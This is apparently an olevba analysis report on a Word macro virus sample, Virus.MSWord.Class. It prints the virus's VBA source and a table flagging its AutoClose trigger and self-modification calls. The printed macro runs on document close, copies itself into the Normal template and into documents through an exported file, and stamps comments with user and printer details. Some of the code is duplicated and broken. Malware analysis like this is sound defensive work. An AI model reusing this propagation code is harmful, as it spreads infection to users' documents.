olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ec-fb1e5b77a524ac127c566f839ed5fe1071171d6c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ec-fb1e5b77a524ac127c566f839ed5fe1071171d6c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Jeremy Smith6/10/1999 14:01:40HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt > 70 And ad > 0 Then GoTo out
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt < 70 Then
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End If
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
host.codemodule.AddFromFile ("c:\class.sys")
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 1 To 16
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .deletelines 1
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
If nt < 70 Then
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 1 To 4
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline 91, "Sub ToolsMacro()"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 70 To 81
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
        .deletelines 62
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline 35, "    For x = 1 To 4"
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End If
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
With host.codemodule
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    For x = 2 To 104 Step 2
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
    Next x
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
End With
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
out:
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
Sub ToolsMacro()
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
'Jeremy Smith6/10/1999 14:01:41HP LaserJet 4 Plus on LPT1:Receipt.dot
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End If
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
With host.codemodule
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    For x = 2 To 104 Step 2
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
    Next x
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End With
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
out:
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End Sub
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
Sub ViewVBCode()
'Michele Withers10/02/99 17:03:21HP LaserJet 4 Plus on \\EBCCGEN3\HP4PRECEIPT.DOT
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
